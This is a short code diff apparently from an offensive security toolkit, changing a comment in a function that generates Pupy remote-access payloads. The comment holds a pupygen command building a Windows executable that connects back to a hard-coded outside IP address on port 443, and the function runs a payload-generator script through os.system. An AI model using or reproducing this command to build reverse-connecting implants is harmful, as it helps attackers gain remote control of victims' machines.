@@ -49,7 +49,7 @@ transport_List = [
 ]
 
 def generate_pupy_payload():
-    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
+    # python pupygen.py -f exe_x86 connect --host 54.241.135.223:443
     os.system('python /root/ArmsCommander/remoteexploits/Pupy_Payload_Generator.py')
     return
 
